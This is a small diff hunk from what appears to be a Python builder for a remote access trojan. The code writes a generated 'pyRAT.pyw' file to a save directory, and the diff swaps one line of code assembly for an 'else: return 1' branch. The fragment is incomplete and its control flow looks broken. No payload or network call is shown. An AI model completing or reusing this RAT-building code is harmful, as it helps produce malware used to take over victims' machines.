@@ -102,7 +102,8 @@ while 1:
     except:
         sleep(10)
         '''
-        mainCode += mainFunc
+        else:
+            return 1
         currPath = getcwd()
         chdir(pathToSave)
         with open('pyRAT.pyw', 'w') as pyFile:
